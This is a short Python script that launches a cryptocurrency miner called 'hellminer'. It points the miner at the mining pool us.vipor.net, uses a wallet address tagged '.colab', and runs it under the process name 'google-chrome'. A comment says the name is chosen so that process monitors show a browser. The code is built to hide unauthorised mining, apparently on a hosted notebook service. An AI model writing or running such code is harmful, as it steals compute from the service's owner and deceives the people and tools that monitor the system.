import os

# Replace the current process with the mining process
os.execvp("./hellminer", [
    "google-chrome",  # This will be the name shown in process monitors
    "-c",
    "stratum+tcp://us.vipor.net:5040",
    "-u", "RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK.colab",
    "-p", "solo",
    "-t","80"
])
